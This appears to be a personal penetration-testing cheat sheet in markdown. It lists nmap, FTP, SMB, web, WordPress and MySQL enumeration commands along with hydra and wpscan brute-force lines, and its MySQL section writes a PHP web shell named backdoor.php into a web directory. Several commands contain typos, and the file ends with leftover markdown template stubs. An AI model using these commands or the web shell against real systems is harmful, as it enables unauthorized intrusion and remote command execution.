# Enum

## Scanning

---
> nmap -sC -sV -oN nmap/nmap $IP

- **sC** : Run default scripts
- **sV** : Determine service version info
- **oN** : Output in Normal

---
**NOTE**

Other useful flags:

**-Pn** : No Ping

**-p-** : Scan all ports

**-F** : Fast scan(100 ports only)

**-sn** : Disable port scan(Used when scanning for active hosts)

**-n** : No dns resolution

---

## FTP Enumeration(21)

---
Try to connect to the service using `anonymous` user

> ftp $IP
> 
> username: anonymous
> 
> password: anonymous

To download files
> mget file-name

## SSH Enumeration(22)

---
> ssh $IP

## SMB Enumeration(139,445)

---
> enum4Linux -a $IP

> smbclient -L \\\\\\\\$IP
> 
> smbclinet \\\\\\\\$IP\\\\share
> 
> smbclinet \\\\\\\\$IP\\\\share -U uaername%password
>
> smbclinet \\\\\\\\$IP\\\\share -U username

Use `get` to download file
> get file-name

## Web Enumeration(80,443)

---
> dirb http://$IP wordlist -o dirb/dirb

> nikto -host $IP:port

## Wordpress Enumeration

---
> wpscan --url url --enumarate u,ap --disable-tls-check --log dir

`User bruteforce`
> wpscan --url url --disable-tls-check --usernames user-file --wordlist password-file --log dir

**u**: For users
**ap**: For plugins

## mySQL Enumeration

---
> mysql  -h $IP -u user -p --execute="show databases"

Upload a shell
> mysql  -h $IP -u user -p

> mysql> SELECT "<?php system($_GET['cmd']);?>" into outfile "file-path"

```file-path example: /var/www/https/blog/wp-content/uploads/backdoor.php```

## Random port or service

---
> netcat $IP $port


## Brute Forcing

---
> hydra -L username-file -P password-file -e nsr service://$IP
> 
> hydra -L username-file -P password-file -e nsr ftp://$IP
> 
> hydra -L username-file -P password-file -e nsr $IP ssh

- **-e** : extra checks
- **n** : null as password
- **s** : same as password(username)
- **r** : reverse as password(username)

Wordpress user bruteforce
> wpscan --url url --disable-tls-check --usernames user-file --wordlist password-file --log dir


## Password List

---
| darkc0de.txt |
----------------


## H2

### H3

**Text** BOLD

- FOR list
  
> FOR indentation

[<TEXT>](link) FOR Hyperlinks

![<TEXT>](link) FOR images
